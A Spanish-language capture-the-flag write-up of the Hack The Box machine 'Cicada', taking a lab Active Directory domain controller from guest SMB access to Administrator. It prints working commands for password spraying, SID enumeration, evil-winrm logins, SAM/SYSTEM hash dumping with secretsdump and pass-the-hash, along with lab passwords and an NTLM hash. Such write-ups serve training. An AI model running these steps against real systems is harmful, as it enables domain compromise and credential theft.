---
title: "Cicada — EASY"
date: 2026-02-02 12:00:00 -0700
categories: [Writeups, HTB]
tags: [HTB, cicada, active-directory, smb, ldap, winrm, secretsdump, pass-the-hash, SeBackupPrivilege]
image: /assets/img/cicada/Cicada-HTB.png
toc: true
comments: true
description: "Writeup técnico paso a paso de 'Cicada' (HTB): enumeración de un Domain Controller, abuso de SMB guest para filtrar una contraseña por defecto, enumeración LDAP autenticada para encontrar credenciales en un atributo de usuario, extracción de creds desde un script en un share DEV, acceso por WinRM y escalada a Administrator abusando de SeBackupPrivilege + secretsdump + Pass-the-Hash."
---

# 🚀 Cicada — EASY

📅 **Fecha:** 2026-02-02
🔗 **IP objetivo:** `10.129.231.149`
🔍 **Estado:** 🎯 Resuelta ✅
👤 **Autor:** Roberto

## TL;DR

El target es un **Domain Controller** (DNS/Kerberos/LDAP/SMB/WinRM). Con **SMB guest** encontramos en el share **HR** una contraseña “default” de nuevos empleados. Con **lookupsid** enumeramos usuarios y hacemos **password spraying** (1 intento por usuario) hasta identificar a `michael.wrightson` con credenciales válidas. Usando LDAP autenticado, enumeramos usuarios y encontramos que `david.orelious` tenía una contraseña expuesta en su **description**. Con `david` accedemos al share **DEV** y descargamos un script de PowerShell con credenciales de `emily.oscars`. Con esas credenciales entramos por **WinRM** y obtenemos `user.txt`. Finalmente, `emily` tiene **SeBackupPrivilege**, lo que permite extraer `SAM` y `SYSTEM`, dumpear hashes con `secretsdump` y hacer **Pass-the-Hash** para entrar como `Administrator` y leer `root.txt`.

---

## Reconocimiento

Empezamos con un escaneo completo para ver superficie:

```bash
sudo nmap -sCV -p- -Pn -n -A --min-rate 5000 10.129.231.149 -oN escaneo.txt
```

```bash
┌──(kali㉿kali)-[~/hackthebox/cicada]
└─$ sudo nmap -sCV -p- -Pn -n -A --min-rate 5000 10.129.6.132 -oN escaneo.txt
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-30 22:59 -0500
Stats: 0:00:58 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 84.62% done; ETC: 23:00 (0:00:06 remaining)
Nmap scan report for 10.129.6.132
Host is up (0.090s latency).
Not shown: 65522 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-31 11:00:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-01-31T11:02:02+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-01-31T11:02:01+00:00; +6h59m59s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-01-31T11:02:02+00:00; +7h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-01-31T11:02:01+00:00; +6h59m59s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
62855/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s
| smb2-time: 
|   date: 2026-01-31T11:01:25
|_  start_date: N/A

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   89.75 ms 10.10.14.1
2   90.09 ms 10.129.6.132

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 128.26 seconds

```


### Lectura rápida del resultado

Los puertos que importan y qué significan:

* **53/tcp (DNS)**: típico en DC. Si hay zona interna, se puede enumerar.
* **88/tcp (Kerberos)**: confirma dominio AD; abre la puerta a ataques como AS-REP roast / Kerberoasting (según config).
* **135/139/445 (RPC/NetBIOS/SMB)**: enumeración de shares, usuarios, políticas; muchas cadenas AD empiezan aquí.
* **389/636 (LDAP/LDAPS)**: la “base de datos” del dominio; con creds se puede enumerar usuarios, grupos y atributos.
* **3268/3269 (Global Catalog)**: LDAP a nivel bosque; útil en entornos multi-dominio.
* **5985 (WinRM)**: acceso remoto tipo PowerShell. Cuando tengas creds, esto puede ser tu “SSH” en Windows.

Con esto ya huele a DC: `cicada.htb`, host `CICADA-DC`.

---

## Enumeración SMB (Guest)

Como no teníamos usuario al inicio, probamos SMB con `guest` para ver qué shares eran accesibles:

```bash
smbmap -H 10.129.231.149 -u guest
```

```bash
┌──(kali㉿kali)-[~/hackthebox/cicada]
└─$ smbmap -H 10.129.231.149 -u guest            

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
[+] IP: 10.129.231.149:445      Name: cicada.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        DEV                                                     NO ACCESS
        HR                                                      READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
[*] Closed 1 connections                  
```

Vimos algo muy jugoso:

* `HR` → **READ ONLY**

Entramos con `smbclient` y descargamos el archivo:

```bash
smbclient //10.129.231.149/HR -U guest
# ls
# get "Notice from HR.txt"
```

Al leerlo:

```bash
┌──(kali㉿kali)-[~/hackthebox/cicada]
└─$ cat Notice\ from\ HR.txt 

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp

```

Encontramos una contraseña “default” para nuevos empleados:

> **Default password:** `Cicada$M6Corpb*@Lp#nZp!8`



---

## Enumeración de usuarios sin creds (lookupsid)

Antes de probar la contraseña, necesitamos una lista de usuarios. Con `impacket-lookupsid` podemos enumerar SIDs/RIDs incluso con acceso anónimo/guest si el DC lo permite:

```bash
┌──(kali㉿kali)-[~/hackthebox/cicada]
└─$ impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at cicada.htb
[*] StringBinding ncacn_np:cicada.htb[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-917908876-1423158569-3159038727
498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: CICADA\Administrator (SidTypeUser)
501: CICADA\Guest (SidTypeUser)
502: CICADA\krbtgt (SidTypeUser)
512: CICADA\Domain Admins (SidTypeGroup)
513: CICADA\Domain Users (SidTypeGroup)
514: CICADA\Domain Guests (SidTypeGroup)
515: CICADA\Domain Computers (SidTypeGroup)
516: CICADA\Domain Controllers (SidTypeGroup)
517: CICADA\Cert Publishers (SidTypeAlias)
518: CICADA\Schema Admins (SidTypeGroup)
519: CICADA\Enterprise Admins (SidTypeGroup)
520: CICADA\Group Policy Creator Owners (SidTypeGroup)
521: CICADA\Read-only Domain Controllers (SidTypeGroup)
522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
525: CICADA\Protected Users (SidTypeGroup)
526: CICADA\Key Admins (SidTypeGroup)
527: CICADA\Enterprise Key Admins (SidTypeGroup)
553: CICADA\RAS and IAS Servers (SidTypeAlias)
571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
1000: CICADA\CICADA-DC$ (SidTypeUser)
1101: CICADA\DnsAdmins (SidTypeAlias)
1102: CICADA\DnsUpdateProxy (SidTypeGroup)
1103: CICADA\Groups (SidTypeGroup)
1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson (SidTypeUser)
1108: CICADA\david.orelious (SidTypeUser)
1109: CICADA\Dev Support (SidTypeGroup)
1601: CICADA\emily.oscars (SidTypeUser)
```

De ahí sacamos los usuarios humanos (tipo `nombre.apellido`), por ejemplo:

* `john.smoulder`
* `sarah.dantelia`
* `michael.wrightson`
* `david.orelious`
* `emily.oscars`

Los guardamos en `usuarios.txt`.

---

## Password spraying (1 intento por usuario)

Con una contraseña conocida (del archivo de HR) y pocos usuarios, hacemos un spraying **controlado**:

```bash
┌──(kali㉿kali)-[~/hackthebox/cicada]
└─$ nxc smb 10.129.231.149 -u usuarios.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
```

Resultado clave:

* `michael.wrightson` **sí** autenticó


---

## SMB con credenciales (michael)

Con `michael` repetimos enumeración de shares:

```bash
┌──(kali㉿kali)-[~/hackthebox/cicada]
└─$ smbmap -H 10.129.231.149 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' 

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.129.231.149:445      Name: cicada.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        DEV                                                     NO ACCESS
        HR                                                      READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections                                                                                                   
```

Ahora aparecen accesibles:

* `NETLOGON` → READ ONLY
* `SYSVOL` → READ ONLY

Esto confirma que ya somos **usuario de dominio real** (no solo guest).

---

## Enumeración SMB autenticada (usuarios + Description)

![LDAP enum mostrando password en description](/assets/img/cicada/nxc-ldap-users.png)

En esta enumeración detectamos algo muy típico (y muy triste):

📌 Un usuario (`david.orelious`) tenía una contraseña puesta en el atributo **description**.

Con eso obtenemos credenciales para `david.orelious`.

---

## Acceso a share DEV (david)

Probamos shares con las creds de `david`:

```bash
┌──(kali㉿kali)-[~/hackthebox/cicada]
└─$ smbmap -H 10.129.231.149 -u david.orelious -p 'aRt$Lp#7t*VQ!3'
```

Ahora el share interesante es **DEV**.

![SMBMap con david.orelious](/assets/img/cicada/smbmap-david.png)

Entramos y descargamos un script:

```bash
┌──(kali㉿kali)-[~/hackthebox/cicada]
└─$ smbclient //10.129.231.149/DEV -U david.orelious              
Password for [WORKGROUP\david.orelious]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 08:31:39 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 13:28:22 2024

                4168447 blocks of size 4096. 481228 blocks available
smb: \> get "Backup_script.ps1"
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (1.6 KiloBytes/sec) (average 1.6 KiloBytes/sec)
```

El script contiene credenciales hardcodeadas:

```bash
┌──(kali㉿kali)-[~/hackthebox/cicada]
└─$ cat Backup_script.ps1 

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```
---

## Acceso por WinRM (emily)

Con las credenciales de `emily.oscars`, intentamos WinRM (puerto 5985):
```bash
┌──(kali㉿kali)-[~/hackthebox/cicada]
└─$ evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
Evil-WinRM shell v3.9
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> ls
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami
cicada\emily.oscars
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> ls


    Directory: C:\Users\emily.oscars.CICADA\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         1/31/2026   2:55 AM             34 user.txt


*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> cat user.txt
7039b1fc2c570d4bdaf91***********
```

---

## Privilege Escalation — SeBackupPrivilege → SAM/SYSTEM → secretsdump → Pass-the-Hash

Ya dentro, enumeramos privilegios:

```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Lo relevante:

* `SeBackupPrivilege` **Enabled**
* `SeRestorePrivilege` **Enabled**

### ¿Por qué esto rompe el sistema?

`SeBackupPrivilege` permite leer archivos “como si fueras el sistema de backups”, lo que en la práctica **salta permisos NTFS** en muchos escenarios.

Esto abre una ruta clásica:

1. Extraer hives del registro (`SAM` y `SYSTEM`)
2. Dumpear hashes locales
3. Autenticar como `Administrator` usando **Pass-the-Hash**

### 1) Guardar SAM y SYSTEM desde la sesión WinRM

En la máquina víctima:

desde Evil-WinRM descargamos:

```powershell
download C:\sam
download C:\system
```

### 2) Extraer hashes localmente

En Kali:

```bash
┌──(kali㉿kali)-[~/hackthebox/cicada]
└─$ impacket-secretsdump -sam sam -system system local                               
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up... 
```

Ahí obtenemos el NTLM hash de `Administrator`.

### 3) Pass-the-Hash con Evil-WinRM

Ahora entramos como Administrator sin conocer la contraseña en claro:

```bash
┌──(kali㉿kali)-[~/hackthebox/cicada]
└─$ evil-winrm -i cicada.htb -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 
Evil-WinRM shell v3.9
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

Y finalmente:

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         1/31/2026   2:55 AM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
5b166125e8f44c67f71e4***********
```

🏁 **Root conseguido.**

---

Explicación - Resumen

La máquina Cicada representa un entorno típico de Active Directory corporativo, donde la explotación no depende de una vulnerabilidad puntual, sino de una cadena de malas prácticas acumuladas.

El compromiso inicia con enumeración pasiva por SMB usando guest, lo que permitió acceder al share HR y obtener una contraseña por defecto utilizada en procesos de onboarding. Con esta información y mediante enumeración de usuarios vía RPC (lookupsid), fue posible realizar un password spraying controlado, logrando acceso como un usuario de dominio válido.

Con credenciales reales, LDAP autenticado se convierte en una fuente crítica de información. Durante la enumeración de atributos de usuario se identificó que uno de ellos almacenaba una contraseña directamente en el campo description, un error común en entornos mal administrados. Esto habilitó acceso adicional a recursos SMB.

El acceso al share DEV reveló un script de PowerShell con credenciales hardcodeadas de otro usuario (emily.oscars). Estas credenciales permitieron conexión remota vía WinRM, obteniendo una sesión interactiva en el sistema y la flag de usuario.

La escalada final se basó en la enumeración de privilegios locales, donde se detectó que el usuario poseía SeBackupPrivilege. Este privilegio permite leer archivos protegidos del sistema, lo que habilitó la extracción de los hives SAM y SYSTEM. A partir de ellos se obtuvieron los hashes locales usando Impacket secretsdump.

Finalmente, se abusó de Pass-the-Hash para autenticarse como Administrator vía WinRM, logrando control total del Domain Controller y acceso a la flag de root.

En conjunto, esta máquina demuestra cómo la falta de higiene en credenciales, permisos y automatizaciones internas puede llevar a un compromiso completo del dominio, incluso sin explotar vulnerabilidades avanzadas.

Happy hacking 🙂
